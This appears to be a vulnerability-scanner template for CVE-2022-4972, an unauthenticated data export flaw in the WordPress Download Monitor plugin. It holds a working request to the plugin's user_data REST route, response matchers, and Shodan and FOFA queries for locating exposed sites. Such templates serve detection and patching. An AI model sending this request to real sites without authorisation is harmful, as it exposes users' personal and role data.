id: CVE-2022-4972

info:
  name: Download Monitor <= 4.7.51 - Missing Authorization to Unauthenticated Data Export
  author: popcorn94
  severity: high
  description: |
    Download Monitor plugin for WordPress up to 4.7.51 contains an authorization bypass caused by missing capability check on REST-API routes related to reporting, letting unauthenticated attackers view sensitive data, exploit requires no authentication.
  impact: |
    Unauthenticated attackers can access sensitive user data and information meant for administrators, leading to privacy breaches.
  remediation: |
    Update to the latest version of Download Monitor plugin.
  reference:
    - https://plugins.trac.wordpress.org/changeset/2822758/download-monitor/trunk/src/Admin/Reports/class-dlm-reports.php?contextall=1&old=2821522&old_path=%2Fdownload-monitor%2Ftrunk%2Fsrc%2FAdmin%2FReports%2Fclass-dlm-reports.php
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/a9000c52-fdd7-43e2-ae6a-9f127c4a9fcd?source=cve
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2022-4972
    cwe-id: CWE-862
    epss-score: 0.00416
    epss-percentile: 0.60753
    cpe: cpe:2.3:a:wpchill:download_monitor:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: wpchill
    product: download_monitor
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/download-monitor/"
    fofa-query: body="/wp-content/plugins/download-monitor/"
  tags: cve,cve2022,wordpress,wp-plugin,wordfence,download-monitor,info-leak

http:
  - raw:
      - |
        GET /wp-json/download-monitor/v1/user_data HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

    matchers:
      - type: dsl
        dsl:
          - contains_all(body, '"id"', '"nicename"', '"display_name"', '"role"')
          - status_code == 200
        condition: and
